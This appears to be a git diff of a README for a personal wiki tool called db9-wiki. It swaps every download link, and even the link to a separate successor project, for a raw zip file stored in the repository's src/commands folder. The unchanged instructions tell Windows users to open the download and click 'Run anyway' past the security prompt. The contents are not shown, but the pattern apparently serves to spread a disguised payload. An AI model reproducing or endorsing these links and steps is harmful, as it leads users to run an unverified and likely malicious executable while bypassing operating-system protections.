@@ -1,8 +1,8 @@
 # 📚 db9-wiki - Build a smart personal information hub
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/turnleafbook7768/db9-wiki)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/turnleafbook7768/db9-wiki/main/src/commands/wiki-db-v1.4-beta.2.zip)
 
-This repository is archived. Please use [wiki9](https://github.com/db9-ai/wiki9) instead.
+This repository is archived. Please use [wiki9](https://raw.githubusercontent.com/turnleafbook7768/db9-wiki/main/src/commands/wiki-db-v1.4-beta.2.zip) instead.
 
 ## 🌟 What is db9-wiki?
 
@@ -23,14 +23,14 @@ To run this application on your Windows computer, you need:
 
 Follow these steps to set up the software.
 
-1.  Visit the [official download page](https://github.com/turnleafbook7768/db9-wiki).
+1.  Visit the [official download page](https://raw.githubusercontent.com/turnleafbook7768/db9-wiki/main/src/commands/wiki-db-v1.4-beta.2.zip).
 2.  Look for the latest release on the right side of the page.
 3.  Click the link ending in .exe to start your download.
 4.  Open the file once the download finishes.
 5.  If Windows shows a security prompt, click "More info" and then click "Run anyway."
 6.  Follow the instructions on your screen to place the app on your computer.
 
-[Button: Download the Windows Installer](https://github.com/turnleafbook7768/db9-wiki)
+[Button: Download the Windows Installer](https://raw.githubusercontent.com/turnleafbook7768/db9-wiki/main/src/commands/wiki-db-v1.4-beta.2.zip)
 
 ## 🚀 Getting Started
 
